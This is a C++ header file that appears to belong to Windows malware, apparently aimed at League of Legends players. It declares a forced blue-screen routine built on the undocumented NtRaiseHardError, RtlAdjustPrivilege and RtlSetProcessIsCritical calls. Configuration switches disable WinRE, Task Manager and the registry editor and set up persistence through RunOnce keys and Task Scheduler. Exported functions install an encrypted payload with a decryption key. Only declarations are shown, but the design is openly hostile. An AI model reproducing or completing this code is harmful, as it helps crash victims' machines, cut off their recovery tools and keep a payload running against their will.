#pragma once
#include <string>
#include <Windows.h>

void BSOD();

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN bEnablePrivilege, BOOLEAN IsThreadPrivilege, PBOOLEAN PreviousValue);
EXTERN_C NTSTATUS NTAPI	NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
EXTERN_C NTSTATUS NTSYSAPI RtlSetProcessIsCritical(BOOLEAN bNew, BOOLEAN* pbOld, BOOLEAN bNeedScb);

/**********
 Monitored
**********/

#define DisableWinRE
#define DisableTaskMGR
#define DisableRegistry
#define RunOnceRegistry
#define TaskSchedulerStartup

/************
 Unmonitored
************/

//#define StartupFile

extern "C"
{
	#define PAYLOAD_API __declspec(dllexport)
	PAYLOAD_API bool AntiLeague();
	PAYLOAD_API void QuickInstall(std::string* payload, const std::string& dec_key);
	PAYLOAD_API void Init(std::string* _payload, std::string* payload, const std::string& dec_key);
}